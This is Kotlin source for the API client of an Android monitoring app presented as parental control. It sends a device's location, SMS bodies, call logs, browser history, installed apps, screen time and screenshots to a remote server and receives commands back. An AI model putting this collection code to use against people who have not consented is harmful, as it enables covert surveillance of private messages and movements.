package com.parentalcontrol.app.api

import com.parentalcontrol.app.utils.BatteryInfo
import com.parentalcontrol.app.utils.CallLogEntry
import com.parentalcontrol.app.utils.DeviceInfo
import com.parentalcontrol.app.utils.InstalledApp
import com.parentalcontrol.app.utils.LocationData
import com.parentalcontrol.app.utils.SmsMessage
import com.parentalcontrol.app.utils.ScreenTimeData
import com.parentalcontrol.app.utils.WebHistoryEntry
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

object ApiClient {

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .build()

    private val JSON_MEDIA_TYPE = "application/json; charset=utf-8".toMediaType()

    private fun authHeaders(): Map<String, String> {
        val headers = mutableMapOf("Content-Type" to "application/json")
        CloudConfig.accessToken?.let {
            headers["Authorization"] = "Bearer $it"
        }
        return headers
    }

    private fun buildRequest(url: String, body: String? = null, method: String = "POST"): Request {
        val builder = Request.Builder().url(url)
        authHeaders().forEach { (k, v) -> builder.addHeader(k, v) }
        if (body != null) {
            builder.method(method, body.toRequestBody(JSON_MEDIA_TYPE))
        }
        return builder.build()
    }

    // ─── Auth ───────────────────────────────────────────────────────────

    fun register(
        email: String, password: String, displayName: String, role: String = "child"
    ): Result {
        return try {
            val payload = JSONObject().apply {
                put("email", email)
                put("password", password)
                put("display_name", displayName)
                put("role", role)
            }
            val request = Request.Builder()
                .url("${CloudConfig.apiBaseUrl}/auth/register")
                .post(payload.toString().toRequestBody(JSON_MEDIA_TYPE))
                .addHeader("Content-Type", "application/json")
                .build()
            val response = client.newCall(request).execute()
            val body = response.body?.string() ?: "{}"
            if (response.isSuccessful) {
                val json = JSONObject(body)
                CloudConfig.accessToken = json.getString("token")
                CloudConfig.refreshToken = json.optString("refresh_token", null)
                CloudConfig.userId = json.getJSONObject("user").getString("id")
                CloudConfig.userEmail = json.getJSONObject("user").getString("email")
                CloudConfig.userRole = json.getJSONObject("user").getString("role")
                Result.Success(json)
            } else {
                val json = JSONObject(body)
                Result.Error(json.optString("error", "Registration failed"))
            }
        } catch (e: Exception) {
            Result.Error(e.message ?: "Connection error")
        }
    }

    fun login(email: String, password: String): Result {
        return try {
            val payload = JSONObject().apply {
                put("email", email)
                put("password", password)
            }
            val request = Request.Builder()
                .url("${CloudConfig.apiBaseUrl}/auth/login")
                .post(payload.toString().toRequestBody(JSON_MEDIA_TYPE))
                .addHeader("Content-Type", "application/json")
                .build()
            val response = client.newCall(request).execute()
            val body = response.body?.string() ?: "{}"
            if (response.isSuccessful) {
                val json = JSONObject(body)
                CloudConfig.accessToken = json.getString("token")
                CloudConfig.refreshToken = json.optString("refresh_token", null)
                CloudConfig.userId = json.getJSONObject("user").getString("id")
                CloudConfig.userEmail = json.getJSONObject("user").getString("email")
                CloudConfig.userRole = json.getJSONObject("user").getString("role")
                Result.Success(json)
            } else {
                val json = JSONObject(body)
                Result.Error(json.optString("error", "Login failed"))
            }
        } catch (e: Exception) {
            Result.Error(e.message ?: "Connection error")
        }
    }

    fun refreshToken(): Boolean {
        return try {
            val payload = JSONObject()
            val request = Request.Builder()
                .url("${CloudConfig.apiBaseUrl}/auth/refresh")
                .post(payload.toString().toRequestBody(JSON_MEDIA_TYPE))
                .addHeader("Authorization", "Bearer ${CloudConfig.refreshToken}")
                .addHeader("Content-Type", "application/json")
                .build()
            val response = client.newCall(request).execute()
            if (response.isSuccessful) {
                val json = JSONObject(response.body?.string() ?: "{}")
                CloudConfig.accessToken = json.getString("token")
                true
            } else false
        } catch (e: Exception) {
            false
        }
    }

    // ─── Pairing ────────────────────────────────────────────────────────

    fun claimPairing(code: String): Result {
        return try {
            val payload = JSONObject().apply { put("pairing_code", code) }
            val response = client.newCall(
                buildRequest("${CloudConfig.apiBaseUrl}/pairing/claim", payload.toString())
            ).execute()
            val body = response.body?.string() ?: "{}"
            if (response.isSuccessful) Result.Success(JSONObject(body))
            else Result.Error(JSONObject(body).optString("error", "Pairing failed"))
        } catch (e: Exception) {
            Result.Error(e.message ?: "Connection error")
        }
    }

    // ─── Device Registration ────────────────────────────────────────────

    fun registerDevice(deviceInfo: DeviceInfo): Result {
        return try {
            val payload = JSONObject().apply {
                put("device_id", CloudConfig.deviceId)
                put("device_name", deviceInfo.deviceName)
                put("manufacturer", deviceInfo.manufacturer)
                put("model", deviceInfo.model)
                put("android_version", deviceInfo.androidVersion)
                put("sdk_version", deviceInfo.sdkVersion)
            }
            val response = client.newCall(
                buildRequest("${CloudConfig.apiBaseUrl}/device/register", payload.toString())
            ).execute()
            val body = response.body?.string() ?: "{}"
            if (response.isSuccessful) Result.Success(JSONObject(body))
            else Result.Error(JSONObject(body).optString("error", "Device registration failed"))
        } catch (e: Exception) {
            Result.Error(e.message ?: "Connection error")
        }
    }

    fun getDeviceConfig(): JSONObject? {
        return try {
            val request = buildRequest(
                "${CloudConfig.apiBaseUrl}/device/${CloudConfig.deviceId}/config",
                method = "GET"
            )
            val response = client.newCall(request).execute()
            if (response.isSuccessful) {
                JSONObject(response.body?.string() ?: "{}")
            } else null
        } catch (e: Exception) {
            null
        }
    }

    // ─── Reporting ──────────────────────────────────────────────────────

    fun buildReportPayload(
        deviceInfo: DeviceInfo,
        location: LocationData?,
        battery: BatteryInfo,
        smsMessages: List<SmsMessage>,
        callLogs: List<CallLogEntry>,
        installedApps: List<InstalledApp>,
        activities: List<JSONObject>? = null,
        screentime: ScreenTimeData? = null,
        webHistory: List<WebHistoryEntry>? = null
    ): String {
        val payload = JSONObject()
        payload.put("device_id", CloudConfig.deviceId)

        if (location != null) {
            val loc = JSONObject().apply {
                put("latitude", location.latitude)
                put("longitude", location.longitude)
                put("accuracy", location.accuracy)
                put("provider", location.provider)
                put("timestamp", location.timestamp)
            }
            payload.put("location", loc)
        }

        val bat = JSONObject().apply {
            put("level", battery.level)
            put("is_charging", battery.isCharging)
            put("temperature", battery.temperature)
        }
        payload.put("battery", bat)

        val smsArray = JSONArray()
        for (msg in smsMessages) {
            smsArray.put(JSONObject().apply {
                put("id", msg.id)
                put("address", msg.address)
                put("body", if (msg.body.length > 500) msg.body.take(500) else msg.body)
                put("date", msg.date)
                put("type", msg.type)
            })
        }
        payload.put("sms", smsArray)

        val callsArray = JSONArray()
        for (call in callLogs) {
            callsArray.put(JSONObject().apply {
                put("id", call.id)
                put("number", call.number)
                put("name", call.name ?: "")
                put("duration", call.duration)
                put("date", call.date)
                put("type", call.type)
            })
        }
        payload.put("calls", callsArray)

        if (installedApps.isNotEmpty()) {
            val appsArray = JSONArray()
            for (app in installedApps) {
                appsArray.put(JSONObject().apply {
                    put("packageName", app.packageName)
                    put("appName", app.appName)
                    put("versionName", app.versionName ?: "")
                    put("versionCode", app.versionCode)
                    put("firstInstallTime", app.firstInstallTime)
                    put("lastUpdateTime", app.lastUpdateTime)
                })
            }
            payload.put("apps", appsArray)
        }

        if (activities != null) {
            val actsArray = JSONArray()
            for (act in activities) {
                actsArray.put(act)
            }
            payload.put("activities", actsArray)
        }

        if (screentime != null) {
            payload.put("screentime", JSONObject().apply {
                put("total_minutes", screentime.totalMinutes)
                put("unlocks", screentime.unlocks)
                put("date", screentime.date)
            })
        }

        if (webHistory != null) {
            val webArray = JSONArray()
            for (entry in webHistory) {
                webArray.put(JSONObject().apply {
                    put("url", entry.url)
                    put("title", entry.title)
                    put("browser", entry.browser)
                    put("visit_count", entry.visitCount)
                    put("timestamp", entry.timestamp)
                })
            }
            payload.put("webhistory", webArray)
        }

        return payload.toString()
    }

    data class BulkReportResult(
        val success: Boolean,
        val serverTime: Long?,
        val commands: List<JSONObject>?
    )

    fun sendBulkReport(jsonPayload: String): BulkReportResult {
        return try {
            val response = client.newCall(
                buildRequest("${CloudConfig.apiBaseUrl}/report/bulk", jsonPayload)
            ).execute()
            val body = response.body?.string() ?: "{}"
            if (response.isSuccessful) {
                val json = JSONObject(body)
                val cmdArray = json.optJSONArray("commands")
                val commands = if (cmdArray != null) {
                    (0 until cmdArray.length()).map { cmdArray.getJSONObject(it) }
                } else null
                BulkReportResult(true, json.optLong("server_time"), commands)
            } else {
                if (response.code == 401 && CloudConfig.refreshToken != null) {
                    if (refreshToken()) return sendBulkReport(jsonPayload)
                }
                BulkReportResult(false, null, null)
            }
        } catch (e: Exception) {
            BulkReportResult(false, null, null)
        }
    }

    fun updateCommandStatus(commandId: String, status: String): Boolean {
        return try {
            val payload = JSONObject().apply { put("status", status) }
            val response = client.newCall(
                buildRequest(
                    "${CloudConfig.apiBaseUrl}/command/$commandId/status",
                    payload.toString()
                )
            ).execute()
            response.isSuccessful
        } catch (e: Exception) {
            false
        }
    }

    fun reportMedia(mediaType: String, filePath: String): Result {
        return try {
            val url = "${CloudConfig.apiBaseUrl}/report/media"
            val file = java.io.File(filePath)
            val requestBody = okhttp3.MultipartBody.Builder()
                .setType(okhttp3.MultipartBody.FORM)
                .addFormDataPart("device_id", CloudConfig.deviceId)
                .addFormDataPart("media_type", mediaType)
                .addFormDataPart("file", file.name,
                    okhttp3.RequestBody.create(
                        "image/jpeg".toMediaType(), file
                    )
                )
                .build()
            val request = Request.Builder()
                .url(url)
                .addHeader("Authorization", "Bearer ${CloudConfig.accessToken}")
                .post(requestBody)
                .build()
            val response = client.newCall(request).execute()
            if (response.isSuccessful) Result.Success(JSONObject(response.body?.string() ?: "{}"))
            else Result.Error("Upload failed")
        } catch (e: Exception) {
            Result.Error(e.message ?: "Upload error")
        }
    }

    data class UpdateCheckResult(
        val success: Boolean,
        val hasUpdate: Boolean = false,
        val latestVersionCode: Int = 0,
        val downloadUrl: String = "",
        val changelog: String = ""
    )

    fun checkForUpdate(currentVersionCode: Int): UpdateCheckResult {
        return try {
            val url = "${CloudConfig.apiBaseUrl}/app/check-update"
            val json = JSONObject().apply {
                put("device_id", CloudConfig.deviceId)
                put("version_code", currentVersionCode)
            }
            val request = Request.Builder()
                .url(url)
                .addHeader("Content-Type", "application/json")
                .addHeader("Authorization", "Bearer ${CloudConfig.accessToken}")
                .post(json.toString().toRequestBody(JSON_MEDIA_TYPE))
                .build()
            val response = client.newCall(request).execute()
            val body = response.body?.string() ?: "{}"
            val data = JSONObject(body)
            if (response.isSuccessful) {
                UpdateCheckResult(
                    success = true,
                    hasUpdate = data.optBoolean("has_update", false),
                    latestVersionCode = data.optInt("version_code", 0),
                    downloadUrl = data.optString("download_url", ""),
                    changelog = data.optString("changelog", "")
                )
            } else {
                UpdateCheckResult(success = false)
            }
        } catch (e: Exception) {
            UpdateCheckResult(success = false)
        }
    }

    sealed class Result {
        data class Success(val data: JSONObject) : Result()
        data class Error(val message: String) : Result()
    }

    fun uploadScreenshot(file: java.io.File): Boolean {
        return try {
            val mediaType = "image/jpeg".toMediaType()
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("device_id", CloudConfig.deviceId)
                .addFormDataPart("type", "screenshot")
                .addFormDataPart("file", file.name, file.asRequestBody(mediaType))
                .build()

            val request = Request.Builder()
                .url("${CloudConfig.apiBaseUrl}/report/media")
                .addHeader("Authorization", "Bearer ${CloudConfig.accessToken}")
                .post(requestBody)
                .build()

            val response = client.newCall(request).execute()
            response.isSuccessful
        } catch (e: Exception) {
            false
        }
    }
}
